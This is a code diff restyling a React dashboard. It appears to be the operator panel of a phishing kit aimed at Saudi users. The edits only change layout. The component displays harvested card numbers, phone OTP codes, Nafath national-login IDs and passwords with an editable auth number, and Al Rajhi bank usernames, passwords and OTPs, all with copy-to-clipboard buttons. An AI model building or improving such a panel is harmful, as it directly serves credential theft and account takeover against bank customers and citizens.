@@ -569,22 +569,22 @@ export default function Dashboard() {
     if (!value) return null;
     const strValue = String(value);
     return (
-      <div className="flex items-center justify-between group hover:bg-muted/50 px-3 py-2 rounded transition-colors border-b border-border">
-        <span className="font-bold text-gray-700 dark:text-gray-300 text-sm">
-          {label}
-        </span>
-        <div className="flex items-center gap-2">
+      <div className="bg-muted/30 rounded-lg p-3 group hover:bg-muted/50 transition-colors border border-border">
+        <div className="flex items-center gap-2 text-muted-foreground text-xs mb-1">
+          <span className="font-medium">{label}</span>
+        </div>
+        <div className="flex items-center justify-between gap-2">
           <span
             className={cn(
-              "text-gray-600 dark:text-gray-400 font-medium",
-              isLtr && "direction-ltr text-left font-mono",
+              "text-foreground font-medium text-sm truncate",
+              isLtr && "direction-ltr font-mono",
             )}
           >
             {strValue}
           </span>
           <button
             onClick={() => copyToClipboard(strValue, label)}
-            className="opacity-0 group-hover:opacity-100 transition-opacity text-gray-400 hover:text-blue-500"
+            className="opacity-0 group-hover:opacity-100 transition-opacity text-gray-400 hover:text-blue-500 shrink-0"
             data-testid={`copy-${label}`}
           >
             {copiedField === label ? (
@@ -1399,7 +1399,7 @@ export default function Dashboard() {
                     </div>
 
                     {/* Card Details */}
-                    <div className="space-y-1">
+                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                       <DataRow
                         label="رقم البطاقة"
                         value={getCardNumber(selectedApplication)}
@@ -1778,26 +1778,28 @@ export default function Dashboard() {
                     </h3>
                   </div>
                   <div className="p-6 space-y-4">
-                    {selectedApplication.phoneNumber && (
-                      <DataRow
-                        label="رقم الهاتف"
-                        value={selectedApplication.phoneNumber}
-                        isLtr
-                      />
-                    )}
-                    {selectedApplication.phoneCarrier && (
-                      <DataRow
-                        label="شركة الاتصالات"
-                        value={selectedApplication.phoneCarrier}
-                      />
-                    )}
-                    {selectedApplication.phoneIdNumber && (
-                      <DataRow
-                        label="رقم الهوية"
-                        value={selectedApplication.phoneIdNumber}
-                        isLtr
-                      />
-                    )}
+                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
+                      {selectedApplication.phoneNumber && (
+                        <DataRow
+                          label="رقم الهاتف"
+                          value={selectedApplication.phoneNumber}
+                          isLtr
+                        />
+                      )}
+                      {selectedApplication.phoneCarrier && (
+                        <DataRow
+                          label="شركة الاتصالات"
+                          value={selectedApplication.phoneCarrier}
+                        />
+                      )}
+                      {selectedApplication.phoneIdNumber && (
+                        <DataRow
+                          label="رقم الهوية"
+                          value={selectedApplication.phoneIdNumber}
+                          isLtr
+                        />
+                      )}
+                    </div>
                     {selectedApplication.phoneOtpCode && (
                       <div className="bg-pink-50 dark:bg-pink-900/30 rounded-lg p-4 text-center border border-pink-200 dark:border-pink-800">
                         <p className="text-xs text-muted-foreground mb-2">
@@ -1886,16 +1888,18 @@ export default function Dashboard() {
                     </h3>
                   </div>
                   <div className="p-6 space-y-4">
-                    <DataRow
-                      label="رقم الهوية"
-                      value={selectedApplication.nafazId}
-                      isLtr
-                    />
-                    <DataRow
-                      label="كلمة المرور"
-                      value={selectedApplication.nafazPass}
-                      isLtr
-                    />
+                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                      <DataRow
+                        label="رقم الهوية"
+                        value={selectedApplication.nafazId}
+                        isLtr
+                      />
+                      <DataRow
+                        label="كلمة المرور"
+                        value={selectedApplication.nafazPass}
+                        isLtr
+                      />
+                    </div>
 
                     {/* Editable Auth Number */}
                     <div className="bg-purple-50 dark:bg-purple-900/30 rounded-lg p-4 border border-purple-200 dark:border-purple-800">
@@ -1984,24 +1988,26 @@ export default function Dashboard() {
                       الراجحي
                     </h3>
                   </div>
-                  <div className="p-6 space-y-1">
-                    <DataRow
-                      label="اسم المستخدم"
-                      value={selectedApplication.rajhiUser}
-                      isLtr
-                    />
-                    <DataRow
-                      label="كلمة المرور"
-                      value={selectedApplication.rajhiPassword}
-                      isLtr
-                    />
-                    {selectedApplication.rajhiOtp && (
+                  <div className="p-6">
+                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                       <DataRow
-                        label="OTP"
-                        value={selectedApplication.rajhiOtp}
+                        label="اسم المستخدم"
+                        value={selectedApplication.rajhiUser}
                         isLtr
                       />
-                    )}
+                      <DataRow
+                        label="كلمة المرور"
+                        value={selectedApplication.rajhiPassword}
+                        isLtr
+                      />
+                      {selectedApplication.rajhiOtp && (
+                        <DataRow
+                          label="OTP"
+                          value={selectedApplication.rajhiOtp}
+                          isLtr
+                        />
+                      )}
+                    </div>
                   </div>
                 </div>
               )}
